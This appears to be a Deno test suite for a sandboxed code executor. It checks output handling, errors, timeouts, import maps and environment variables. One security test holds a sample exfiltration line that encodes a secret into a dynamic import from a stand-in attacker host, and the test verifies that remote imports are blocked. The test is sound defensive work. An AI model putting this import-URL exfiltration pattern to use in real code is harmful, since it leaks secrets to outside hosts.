import { assertEquals, assertExists, assertRejects } from '@std/assert';
import { executeCode } from '../../src/executor.ts';
import { TestEnvironment } from '../helpers/setup.ts';
import { ExecutionError, FileNotFoundError, TimeoutError } from '../../src/utils/errors.ts';
import { config } from '../../src/config.ts';

Deno.test('Executor - should execute simple code and return JSON output', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // Override config for testing
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'hello',
      `
      console.log(JSON.stringify({
        success: true,
        message: "Hello, World!",
      }));
    `,
    );

    const result = await executeCode({
      codeId: 'hello',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    assertEquals(result.output, {
      success: true,
      message: 'Hello, World!',
    });
    assertEquals(result.exitCode, 0);
    assertEquals(result.signal, null);
    assertExists(result.executionTime);
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should execute code with complex JSON output', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'complex',
      `
      const data = {
        success: true,
        data: {
          number: 42,
          string: "test",
          array: [1, 2, 3],
          object: { key: "value" },
        },
      };
      console.log(JSON.stringify(data));
    `,
    );

    const result = await executeCode({
      codeId: 'complex',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).success, true);
    // deno-lint-ignore no-explicit-any
    assertExists((result.output as any).data);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).data.number, 42);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).data.array, [1, 2, 3]);
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should execute async code', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'async',
      `
      async function delay(ms: number): Promise<void> {
        return new Promise((resolve) => setTimeout(resolve, ms));
      }

      async function main() {
        await delay(100);
        console.log(JSON.stringify({
          success: true,
          message: "Async execution completed",
        }));
      }

      main();
    `,
    );

    const result = await executeCode({
      codeId: 'async',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    assertExists(result.executionTime);
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should handle non-JSON output by wrapping it', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'text',
      `
      console.log("Plain text output");
    `,
    );

    const result = await executeCode({
      codeId: 'text',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    assertEquals(result.output, {
      success: true,
      result: 'Plain text output',
    });
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should handle empty output', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'empty',
      `
      // No output
    `,
    );

    const result = await executeCode({
      codeId: 'empty',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    assertEquals(result.output, {
      success: true,
      result: null,
    });
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should throw FileNotFoundError when file does not exist', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await assertRejects(
      async () => {
        await executeCode({
          codeId: 'non-existent',
          timeout: 5000,
          workspaceDir: env.workspaceDir,
        });
      },
      FileNotFoundError,
    );
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should throw ExecutionError on syntax error', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'syntax-error',
      `
      const result = {
        message: "This will fail"
      // Missing closing brace
    `,
    );

    await assertRejects(
      async () => {
        await executeCode({
          codeId: 'syntax-error',
          timeout: 5000,
          workspaceDir: env.workspaceDir,
        });
      },
      ExecutionError,
    );
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should throw ExecutionError on runtime error', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'runtime-error',
      `
      function throwError() {
        throw new Error("Intentional runtime error");
      }
      throwError();
    `,
    );

    await assertRejects(
      async () => {
        await executeCode({
          codeId: 'runtime-error',
          timeout: 5000,
          workspaceDir: env.workspaceDir,
        });
      },
      ExecutionError,
    );
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should throw TimeoutError when execution exceeds timeout', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'timeout',
      `
      while (true) {
        // Infinite loop
      }
    `,
    );

    await assertRejects(
      async () => {
        await executeCode({
          codeId: 'timeout',
          timeout: 1000,
          workspaceDir: env.workspaceDir,
        });
      },
      TimeoutError,
    );
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should use import map for module resolution', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    // Create a tool module
    await env.writeTool(
      'utils/math.ts',
      `
      export function add(a: number, b: number): number {
        return a + b;
      }
    `,
    );

    // Create code that imports the tool
    await env.writeCode(
      'with-import',
      `
      import { add } from '@/utils/math.ts';

      const result = add(2, 3);
      console.log(JSON.stringify({
        success: true,
        result: result,
      }));
    `,
    );

    const result = await executeCode({
      codeId: 'with-import',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    assertEquals(result.success, true);
    assertEquals(result.output, {
      success: true,
      result: 5,
    });
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should block remote module imports (security test)', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    // Create code that attempts to import a remote module
    // This should fail because --no-remote is enabled
    await env.writeCode(
      'remote-import',
      `
      // Attempt to dynamically import a remote module
      // This should be blocked by --no-remote flag
      const secret = "sensitive-data-12345";
      try {
        await import(\`https://evil.example.com/\${encodeURIComponent(secret)}.ts\`);
        console.log(JSON.stringify({ success: true, message: "Remote import succeeded (SECURITY ISSUE!)" }));
      } catch (error) {
        // Expected: remote imports should be blocked
        console.log(JSON.stringify({ success: true, message: "Remote import blocked as expected" }));
      }
    `,
    );

    const result = await executeCode({
      codeId: 'remote-import',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
    });

    // The code should execute successfully but the remote import should fail
    assertEquals(result.success, true);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).message, 'Remote import blocked as expected');
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should execute code with environment variables', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'with-env',
      `
      const apiKey = Deno.env.get('API_KEY');
      const debugMode = Deno.env.get('DEBUG_MODE');

      console.log(JSON.stringify({
        success: true,
        apiKey: apiKey,
        debugMode: debugMode,
      }));
    `,
    );

    const result = await executeCode({
      codeId: 'with-env',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
      env: {
        API_KEY: 'test-key-123',
        DEBUG_MODE: 'true',
      },
    });

    assertEquals(result.success, true);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).success, true);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).apiKey, 'test-key-123');
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).debugMode, 'true');
  } finally {
    await env.cleanup();
  }
});

Deno.test('Executor - should maintain system environment variables (PATH)', async () => {
  const env = new TestEnvironment();
  await env.setup();
  try {
    // deno-lint-ignore no-explicit-any
    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;

    await env.writeCode(
      'check-path',
      `
      const path = Deno.env.get('PATH');
      const customVar = Deno.env.get('CUSTOM_VAR');

      console.log(JSON.stringify({
        success: true,
        hasPath: !!path,
        customVar: customVar,
      }));
    `,
    );

    const result = await executeCode({
      codeId: 'check-path',
      timeout: 5000,
      workspaceDir: env.workspaceDir,
      env: {
        CUSTOM_VAR: 'test',
      },
    });

    assertEquals(result.success, true);
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).hasPath, true); // PATH should exist
    // deno-lint-ignore no-explicit-any
    assertEquals((result.output as any).customVar, 'test');
  } finally {
    await env.cleanup();
  }
});
